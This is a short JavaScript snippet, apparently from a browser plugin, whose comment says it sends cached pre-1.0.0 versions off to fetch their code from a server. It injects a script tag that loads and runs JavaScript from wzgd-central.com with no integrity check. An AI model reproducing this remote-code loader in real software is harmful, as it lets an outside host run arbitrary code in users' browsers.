/*
This redirects cached versions of the plugin (before v1.0.0) to go get the javascript from the server
*/

var script = document.createElement('script');
script.src = "https://wzgd-central.com/api/deliver/js";
document.head.appendChild(script);

